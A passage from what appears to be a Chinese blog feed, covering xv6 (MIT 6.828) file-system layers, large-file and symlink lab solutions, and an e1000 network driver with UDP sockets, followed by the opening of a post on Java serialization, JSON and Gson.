class="keyword">struct</span> <span class="title">buf</span> *<span class="title">next</span>;</span></span><br><span class="line">  uchar data[BSIZE]; <span class="comment">// BSIZE = 1024</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>　　可以看到, 整个缓存层其实比较简单, 包含了几十个预先分配好的缓存块, 一个缓存头, 以及一个自旋锁. 每个缓存块则包含较多的缓存相关信息, 包括 valid(当前块是否合法), dev(块对应的设备号), blockno(块对应于磁盘中的块号), refcnt(引用数), data(对应的数据) 等. 值得注意的一点是, 这里的 “块” 和磁盘的 “块” 指的不是同一个概念. 磁盘的读写单位为扇区(一般为 512 字节)或簇, 而这里的块指的是一个 buf, 为 1024 字节, 下文中的块均是指 buf. 接收到读缓存块的命令时, 先在 bcache.buf 中查找是否存在对应的块, 如果存在则直接返回, 没有存在则从向磁盘驱动程序拿, 再返回. 接收到写缓存块的命令时, 则直接调用驱动程序进行写入.</p><p>　　注意到缓存区存在锁, 并且每个缓存块也有对应的锁, 因此 Cache 层还有一个重要的作用就是同步所有对硬盘的操作, 这使得文件系统能够较好地支持多线程/进程.</p><p>　　再上来一层则是 logging 层. 首先考虑一个问题, 对于文件系统来说, 由于磁盘的读写速度是较慢的, 一个对磁盘的读写指令完全有可能会因为某些异常而被打断, 比如 crash. 这样一种现象有可能会造成严重的后果. 比如回收一个文件时, 如果出现 crash, 有可能导致<strong>文件系统持有对一个已回收区域的引用, 或者文件系统中存在一个没有引用但却占用空间的区域</strong>. 前者浪费了磁盘的存储空间, 后者可能会导致安全性问题(其他用户如果恰好分配到了这块区域则可以读取到数据). 因此, crash recovery 是很有必要的, 这就是 logging 层的作用. 对应于源文件中的 log.c</p><p>　　logging 的实现原理和 log 其实很相似, 对于每一个写入(transaction)操作(读取操作不需要考虑 crash 造成的问题), log 将需要写入的块的块号记录下来, 然后就返回, 并增加对应 buf 的引用(防止在 cache 层被回收). 真正的写入在 commit 过程中. 在每个文件系统调用结束的时候, log 层判断当前是否已经没有文件系统调用在执行, 如果有的话则执行 commit 操作. write_log 将当前在 log 中留有记录的块写入磁盘中的 log 区, 然后将 logheader(包含 log 的数量等数据) 写入 log 区. 然后再真正开始写入, 将 log 中的块写入真正的目的地, 最后再调用 write_head, 更新 logheader 并写入. 可以代入确定, 无论 crash 在哪一步前后发生, 都不会破坏文件系统结构.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">commit(<span class="keyword">int</span> dev) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">log</span>[dev].lh.n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    write_log(dev);     <span class="comment">// Write modified blocks from cache to log</span></span><br><span class="line">    write_head(dev);    <span class="comment">// Write header to disk -- the real commit</span></span><br><span class="line">    install_trans(dev); <span class="comment">// Now install writes to home locations</span></span><br><span class="line">    <span class="built_in">log</span>[dev].lh.n = <span class="number">0</span>;</span><br><span class="line">    write_head(dev);    <span class="comment">// Erase the transaction from the log</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　Crash Recovery 的操作是发生在文件系统启动的时候, 检查 log 区域中的 logheader 是否包含有已经 commit 但是还没写入对应区域的块, 有的块则将其写入到目的地. 另外, 除了保证文件系统的安全外, log 层还控制了每次文件系统能写入的最大数据(不能超过 log 区的大小).</p><p>　　再上来一层是 inode 层次, 这一层主要用来维护每个文件的信息. inode 总共分为两类, 一个是在磁盘的 dinode, 另一个是在内存中的 inode. 磁盘中的 inode 和每一个文件相对应, 包含文件的大小, 文件数据所在的位置, 文件类型, 对应的设备号等. 结构大概如下:</p><p><img src="/2020/02/22/mit6-828/fs_filerep.png" alt="fs_filrep"></p><p>　　每个 dinode 中存放了 13 个地址(准确来说应该是块号), 其中前十二个指向了 12 个存储于磁盘的块, 第 13 个指向了磁盘中的一个 “目录块”, 这个块中每一个位置都指向了另外一个位于磁盘中的块. 每个块号占 4 字节, 一个块为一个 1024B, 因此一个文件能包含的最大的数据量为 (12+(1024/4)) x 256 = 68608 字节. </p><p>　　位于内存中的 inode 除了包含 dinode 对应的信息外, 还包含了一个锁(防止对文件的并发访问), 一个 inode number 等数据, 从这里开始到上面的层次中都是使用 inode 这样一个抽象来执行文件操作的. 相关的操作位于 file.c 和 fs.c 中. 到这里其实文件系统核心部分已经结束, 下面以对一个文件的 read 和 write 为例, 从上到下过一遍文件系统: </p><p>　　首先, 系统调用触发后, 根据调用号操作系统找到对应的实现函数的地址并跳转, 读入参数后, 系统调用 fileread 函数, 判断文件类型属于 inode(也有可能是管道或者设备等), 并为 inode 上锁后, 调用 readi 函数. 在 readi 函数中, 使用 bread 函数从 buffer 中读取 buf 块, 并将其内容复制到用户制定的缓冲区中. </p><p>　　而对于写数据则稍微麻烦一点. 和前面类似, 进入到 filewrite 函数, 这里需要处理一次写入的数据大小, 每次操作的数据块不能大于 MAXOPBLOCKS, 过大时需要分批调用, 等前面的数据执行完 commit 操作后再次写入. 注意到这里需要用到 logging 层, 因此, 锁定 inode 前还要调用 begin_op 和 end_op 操作, 确保 logging 层的正确运行. 然后调用 writei 函数, 和 readi 类似, 读取 buf 块后, 将数据从用户制定的缓冲区中复制到 buf 里面, 然后调用 log_write 函数将该写入操作记录下来. 退回到 filewrite 函数后, 执行 end_op 操作时, 如果此时不存在其他的文件系统调用的话则进行 commit 将所有 log 真正地写入磁盘当中.</p><h3 id="Large-file"><a href="#Large-file" class="headerlink" title="Large file"></a>Large file</h3><p>　　实验的第一项任务是扩展文件的最大容量. 前面写到, 由于 inode 本身的设计, 一个文件最多只能包含 68608 个字节, 超过的话则无法处理. 在当前来看, 这样的容量显得过小了. 因此, 在这个任务中需要拓展文件的容量. 解决的思路整体上也比较简单直接, 更改 inode 的结构, 之前我们用的是一个一层的间接引用, 现在我们将再增加一个二层的引用. 13 个块中, 前面 11 个是直接指向数据块, 第十二个和之前一样指向一个 “一级目录”, 第十三个指向的具有 “二级目录”, 最后文件的最大的大小就可以变为 (11+256+256x256)x256 = 16845568 Bytes.</p><p>　　首先需要更改 inode 和 dinode 的定义, param.h 中 FISIZE 大小等. 需要修改的核心函数有两个, 一个是 bmap, 用于获取 inode 中第 i 个块对应的块号. 思路和前面其实类似, 目录为空则分配一个, 然后从 cache 中读取, 注意如果修改了 buf, 则需要调用 log_write 将改动保存.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 panic 前插入这几行</span></span><br><span class="line">bn -= NINDIRECT;</span><br><span class="line"><span class="keyword">if</span> (bn &lt; NINDIRECT*NINDIRECT) &#123;</span><br><span class="line">  <span class="keyword">if</span> ((addr = ip-&gt;addrs[NDIRECT+<span class="number">1</span>]) == <span class="number">0</span>)</span><br><span class="line">    ip-&gt;addrs[NDIRECT+<span class="number">1</span>] = addr = balloc(ip-&gt;dev);</span><br><span class="line">  bp = bread(ip-&gt;dev, addr);</span><br><span class="line">  a = (uint*)bp-&gt;data;</span><br><span class="line">  uint idx = bn / NINDIRECT;</span><br><span class="line">  <span class="keyword">if</span> ((addr = a[idx]) == <span class="number">0</span>) &#123;</span><br><span class="line">    a[idx] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    log_write(bp);</span><br><span class="line">  &#125;</span><br><span class="line">  addr = bmap_dfs(ip, bn-idx*NINDIRECT, addr);</span><br><span class="line">  brelse(bp);</span><br><span class="line">  <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> uint</span><br><span class="line">bmap_dfs(struct inode *ip, uint bn, uint addr) &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span>* <span class="title">bp</span> = <span class="title">bread</span>(<span class="title">ip</span>-&gt;<span class="title">dev</span>, <span class="title">addr</span>);</span></span><br><span class="line">  uint* a = (uint*)bp-&gt;data;</span><br><span class="line">  <span class="keyword">if</span> ((addr = a[bn]) == <span class="number">0</span>) &#123;</span><br><span class="line">    a[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    log_write(bp);</span><br><span class="line">  &#125;</span><br><span class="line">  brelse(bp);</span><br><span class="line">  <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　另外一个需要修改的则是 itrunc, 做法类似, 这里就不在赘述了. 使用 balloc 分配新的块, 使用 bread 和 brelse 进行块的读取和释放, 使用 log_write 保存更改.</p><h3 id="Symbolic-link"><a href="#Symbolic-link" class="headerlink" title="Symbolic link"></a>Symbolic link</h3><p>　　另一个任务是添加链接功能, 类似与 windows 中的快捷方式. 思路同样也比较简单. 在 stat.h 中添加新的文件类型的宏 T_SYMLINK, 然后添加新的系统调用 sym_link 以及 symlinktest 加入编译. 这种链接的思想是, 将想要指向的文件路径存放在当前文件当中. 打开这个文件的时候, 特殊判断如果文件属于 T_SYMLINK 类型, 则打开文件中存放的文件路径对应的文件. 因此, 需要更改的为 open 函数. 我的处理方法是, 文件属于 T_SYMLINK 函数时, 则调用 recur_open 函数, 实现如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> open_count = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span>*</span></span><br><span class="line"><span class="class"><span class="title">recur_open</span>(<span class="title">struct</span> <span class="title">inode</span>* <span class="title">ip</span>) &#123;</span></span><br><span class="line">  <span class="keyword">if</span> (open_count &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Cycle encountered\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">char</span> path[MAXPATH];</span><br><span class="line">  readi(ip, <span class="number">0</span>, (uint64)path, <span class="number">0</span>, MAXPATH);</span><br><span class="line">  iunlockput(ip);</span><br><span class="line">  ip = namei(path);</span><br><span class="line">  <span class="keyword">if</span> (ip == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  ilock(ip);</span><br><span class="line">  <span class="keyword">if</span> (ip-&gt;type == T_SYMLINK) &#123;</span><br><span class="line">    open_count += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> recur_open(ip);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ip;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　在文件中进行递归调用, 同时为了防止循环打开, 这里使用一个静态变量进行计数, 每次调用 recur_open 前需要清零. 另外, 在 fcntl.h 中添加新的宏 O_NOFOLLOW, 表明直接打开文件而不根据文件中存放的路径递归地打开.</p><h2 id="Lab-net"><a href="#Lab-net" class="headerlink" title="Lab net"></a>Lab net</h2><p>　　网络应该是 xv6 实验中比较难调试并且难度较大的板块. 在该任务中, 我们要实现一个简易的网卡驱动, 支持使用 socket 进行简单的 udp 通信. 这里需要先过一遍计网的相关知识, 做起来会比较简单.</p><p><img src="/2020/02/22/mit6-828/netstack.png" alt="netstack"></p><p>　　计算机网络现在广泛被人接受的应该是五层架构模型, 自顶向下分别为应用层(HTTP 协议等), 传输层(TCP, UDP 协议等), 网络层(IP 协议等), 数据链路层, 物理层. 每一层只和上下层之间具有直接的依赖关系. 对于大多数应用而言, 只需要用到应用层方面的信息. 在本实验中, 需要实现简单的 UDP 协议, 还需要接触到传输层.</p><h3 id="Driver"><a href="#Driver" class="headerlink" title="Driver"></a>Driver</h3><p>　　第一个任务是写网卡驱动, 对应于 e1000.c 文件. 在这个任务中, 需要完成两个函数 e1000_transmit 和 e1000_recv. 动手之前需要先简单了解网卡驱动的实现原理. 这里是我的理解: 网卡是通过在网卡的寄存器上写入相应的值来进行控制的, 而每个网卡对于交互的要求(比如寄存器每个 bit 的含义)不一定相同, 因此需要有不同的驱动程序来实现. 据说, linux 的源代码中约有一半的源代码都是各种各样的驱动程序, 这应该也是原因之一. 操作系统使用内存映射技术将网卡寄存器的地址映射到虚拟内存空间当中, 我们只需要往寄存器中填入相应的值即可.</p><p>　　整个任务按照实验文档中给的提示就可以通过了, 事实上提示已经把所有需要做的事情写在了上面. 唯一需要注意一点的可能是 cmd 的设置. 完成后, 可以使用 make ping 进行测试.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">e1000_transmit(struct mbuf *m) &#123;</span><br><span class="line">  acquire(&amp;e1000_lock);</span><br><span class="line">  <span class="keyword">int</span> pos = regs[E1000_TDT];</span><br><span class="line">  <span class="keyword">if</span> (pos &gt; TX_RING_SIZE) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Transmit: overflow!\n"</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_transmit;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tx_desc</span>* <span class="title">desc</span> = <span class="title">tx_ring</span> + <span class="title">pos</span>;</span></span><br><span class="line">  <span class="keyword">if</span> (!(desc-&gt;status &amp; E1000_TXD_STAT_DD)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Transmit: status error!\n"</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_transmit;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">last</span> = <span class="title">tx_mbufs</span>[<span class="title">pos</span>];</span></span><br><span class="line">  <span class="keyword">if</span> (last) &#123;</span><br><span class="line">    mbuffree(last);</span><br><span class="line">  &#125;</span><br><span class="line">  print(m);</span><br><span class="line">  tx_mbufs[pos] = m;</span><br><span class="line">  desc-&gt;addr = (uint64) m-&gt;head;</span><br><span class="line">  desc-&gt;length = m-&gt;len;</span><br><span class="line">  desc-&gt;cmd = E1000_TXD_CMD_EOP | E1000_TXD_CMD_RS;</span><br><span class="line">  regs[E1000_TDT] = (pos+<span class="number">1</span>)%TX_RING_SIZE;</span><br><span class="line">  release(&amp;e1000_lock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_transmit:</span><br><span class="line">  release(&amp;e1000_lock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">e1000_recv(<span class="keyword">void</span>) &#123;</span><br><span class="line">  acquire(&amp;e1000_lock);</span><br><span class="line">  <span class="keyword">int</span> pos = (regs[E1000_RDT] + <span class="number">1</span>) % RX_RING_SIZE;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rx_desc</span>* <span class="title">desc</span> = <span class="title">rx_ring</span> + <span class="title">pos</span>;</span></span><br><span class="line">  <span class="keyword">while</span> (desc-&gt;status &amp; E1000_RXD_STAT_DD) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span>* <span class="title">m</span> = <span class="title">rx_mbufs</span>[<span class="title">pos</span>];</span></span><br><span class="line">    mbufput(m, desc-&gt;length);</span><br><span class="line">    rx_mbufs[pos] = mbufalloc(<span class="number">0</span>);</span><br><span class="line">    desc-&gt;addr = (uint64) rx_mbufs[pos]-&gt;head;</span><br><span class="line">    desc-&gt;length = rx_mbufs[pos]-&gt;len;</span><br><span class="line">    desc-&gt;status = <span class="number">0</span>;</span><br><span class="line">    regs[E1000_RDT] = pos;</span><br><span class="line">    pos = (pos + <span class="number">1</span>) % RX_RING_SIZE;</span><br><span class="line">    desc = rx_ring + pos;</span><br><span class="line">    release(&amp;e1000_lock);</span><br><span class="line">    print(m);</span><br><span class="line">    net_rx(m);</span><br><span class="line">    acquire(&amp;e1000_lock);</span><br><span class="line">  &#125;</span><br><span class="line">  release(&amp;e1000_lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Socket"><a href="#Socket" class="headerlink" title="Socket"></a>Socket</h3><p>　　第二个任务是实现 UDP 通信. socket 本身可以看做是一种文件, 这里使用 FD_SOCK 这样一种类型来标记 Socket. 在 file.c 中的 fileclose, fileread, filewrite 函数中需要添加对应的判断, 调用 socket 的关闭, 读写方法(在 def.h 中添加定义, 在 sysnet.c 文件中实现). 这里复习一下 UDP 协议.</p><p>　　UDP 协议是一种无连接的传输协议(与此相对的就是 TCP 协议). 本身 UDP 协议较为简单, 它只是在应用层报文上添加了一个 UDP 头, 其他几乎没有做任何处理. 不提供任何的拥塞控制, 顺序保证, 重传等功能. 这里是 UDP 头的结构:</p><p><img src="/2020/02/22/mit6-828/udp.png" alt="UDP"></p><p>下面是简单的收发数据流程:</p><p>　　数据报到达网卡后, 触发中断, 进入 e1000_recv 方法, 网卡驱动程序将 buf 取出并上传到 net_rx, 再依次经过 net_rx_ip, net_rx_udp 方法去除每一层的报头, 最后到达了 sockrecvudp 方法. 在 sockrecvudp 方法中, 遍历 sockets 列表找到能处理当前 UDP 报文的 socket(注意使用锁), 然后添加到 socket 的 buf 队列当中, 并唤醒等待数据到来的线程(在 sockread 方法中阻塞).<br>　　sockread 方法中, 由于 socket 可能为空, 需要先阻塞, 等待数据到来后再用 copyout 将数据复制到用户指定的缓冲区中, 注意 buf 读完的话要回收.<br>　　write 方法中, 则直接将数据复制到新建的 buf 中(注意要在头部预留足够的空间给后面的协议), 然后调用 net_tx_udp, 依次经过 net_tx_ip, net_tx_eth, e1000_transmit 函数, 数据报发送到了网卡, 经由网卡将数据发送出去, 完成写入功能.</p><p>　　sockclose 方法思路则很简单, 从 sockets 列表中取出 socket, 并将该 socket 中全部的 buf 取出并回收, 然后再将 socket 回收即可. 代码的话在 github 中有, 这里就不贴了.</p><h2 id="Epilogue"><a href="#Epilogue" class="headerlink" title="Epilogue"></a>Epilogue</h2><p>　　到这里整个 mit6.828 系列的实验就结束了. 可以看到, 整个实验难度基本还是落在后面的几个实验当中, 通过做这样的几个实验也加深了自己对操作系统这样一个复杂的概念的认识. 前前后后写实验以及完成小结花费了不少时间, 但现在看来还是比较值得的. 实际中的操作系统比本实验的明显要远远复杂的多, xv6 系统中存在的很多问题, 实际操作系统基本都能解决, 在很多地方应该也有着各式各样的优化. 也正是这些一个个问题的解决, 才有了我们今天能够流畅运行的计算机.</p>]]></content>
      
      
      
        <tags>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Serialization in Java &amp; Gson</title>
      <link href="/2020/01/12/gson/"/>
      <url>/2020/01/12/gson/</url>
      
        <content type="html"><![CDATA[<h2 id="Prologue"><a href="#Prologue" class="headerlink" title="Prologue"></a>Prologue</h2><p>　　对于一个应用程序来说，保存数据几乎是一个必备的功能。当程序退出执行前，我们往往需要将一些关键的数据保存在硬盘/存储卡中，以供下次使用。通常，这样一个过程我们也称之为数据的持久化(persistence)。</p><p>　　在 Java 中，实现数据持久化的方式是序列化(serialization)与反序列化。</p><h2 id="Serialization"><a href="#Serialization" class="headerlink" title="Serialization"></a>Serialization</h2><p>　　那么，什么是序列化呢? 简单来说，序列化就是将一个对象转化成(字节)流的过程。经序列化后的对象变成了流，也就是一串由 0101 组成的字节，我们就可以将其保存在文件系统当中，即使程序退出也不会导致数据的丢失。</p><p>　　当然，我们对数据的保存，最终的目的肯定是在某个时刻要将其重新拿来使用，为此，就需要有反序列化，读取一个流，并将其重新转化成一个对象。很明显，我们可以看出，序列化和反序列化事实上是两个完全”对称”的操作，因此，它就需要满足一个最基本的特征——确定性。对于两个<strong>完全相同</strong>的对象，我们要求每次序列化得到的字节数据应该是完全一样的。</p><p>　　在 Java 中，实现序列化的方式很简单，我们只需要实现 Serializable 接口即可。事实上，Serializable 是一个标记接口，即只用于标识作用的空接口，类似的还有 Clonable 和 Remote。实现该接口后，我们只需要使用 wirteObject 和 readObject 就可以使用 ObjectInputStream 的 readObject() 还有 ObjectOutputStream 的 writeObject(Object obj) 方法来实现持久化。示例如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        A a = <span class="keyword">new</span> A(<span class="number">100</span>, -<span class="number">1</span>);</span><br><span class="line">        String fileName = <span class="string">"test.txt"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(fileName);</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">            oos.writeObject(a);</span><br><span class="line">            oos.close();</span><br><span class="line">            fos.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        A.b = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileInputStream fis = <span class="keyword">new</span> FileInputStream(fileName);</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">            A a0 = (A) ois.readObject();</span><br><span class="line">            print(a0);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(A a)</span> </span>&#123;</span><br><span class="line">        System.out.println(a.a);</span><br><span class="line">        System.out.println(A.b);</span><br><span class="line">        System.out.println(a.c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> b = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">transient</span> <span class="keyword">int</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">A</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.a = a;</span><br><span class="line">        <span class="keyword">this</span>.c = c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　注意到，当变量被标记为 static 或者 transient 的时候，并不会被持久化。static 变量是属于类的，因此没有持久化的必要。而 transient 关键字则是用于另一些特殊情形，比如变量可以通过其他数据计算得到，或者处于安全考虑等等。使用 transient 关键字的变量在 readObject 后会被赋默认值(整型为 0，类则为 null 等)。<br>　　如果不是很清楚的话，不妨运行一下上面那段代码，并看一下代码所得到的输出是什么。可以看到，最后类 A 中只有变量 a 能被持久化。</p><h2 id="Json"><a href="#Json" class="headerlink" title="Json"></a>Json</h2><p>　　在传输数据的时候，尤其是在客户端和服务器之间传输数据的时候，我们往往需要用到这样一个东西，叫 json。</p><p>　　JSON 全称是 JavaScript Object Notation，从名称可以看出，它最初是用于 JavaScript 这门语言当中的，后面经过各种各样的拓展，现在已经成为了一种应用广泛的数据存储格式，各种编程语言中往往会提供各式各样的库去生成或者解析 JSON 文件/字符串了。JSON 能支持 null, string, number, boolean, array, JSON object 这些数据类型。常见的 JSON 文件大概是这个样子(来自维基百科):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"firstName"</span>: <span class="string">"John"</span>,</span><br><span class="line">  <span class="string">"lastName"</span>: <span class="string">"Smith"</span>,</span><br><span class="line">  <span class="string">"isAlive"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">"age"</span>: <span class="number">27</span>,</span><br><span class="line">  <span class="string">"address"</span>: &#123;</span><br><span class="line">    <span class="string">"streetAddress"</span>: <span class="string">"21 2nd Street"</span>,</span><br><span class="line">    <span class="string">"city"</span>: <span class="string">"New York"</span>,</span><br><span class="line">    <span class="string">"state"</span>: <span class="string">"NY"</span>,</span><br><span class="line">    <span class="string">"postalCode"</span>: <span class="string">"10021-3100"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"phoneNumbers"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">"type"</span>: <span class="string">"home"</span>,</span><br><span class="line">      <span class="string">"number"</span>: <span class="string">"212 555-1234"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">"type"</span>: <span class="string">"office"</span>,</span><br><span class="line">      <span class="string">"number"</span>: <span class="string">"646 555-4567"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">"type"</span>: <span class="string">"mobile"</span>,</span><br><span class="line">      <span class="string">"number"</span>: <span class="string">"123 456-7890"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">"children"</span>: [],</span><br><span class="line">  <span class="string">"spouse"</span>: null</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　可以看到，JSON 本身其实就是一个一个的键值对，并且，JSON 对象之间还可以相互嵌套，从这个角度上说，和常见的 HTML，XML 等格式还是一定的相似之处。</p><h2 id="Gson"><a href="#Gson" class="headerlink" title="Gson"></a>Gson</h2><p>　　在 Android 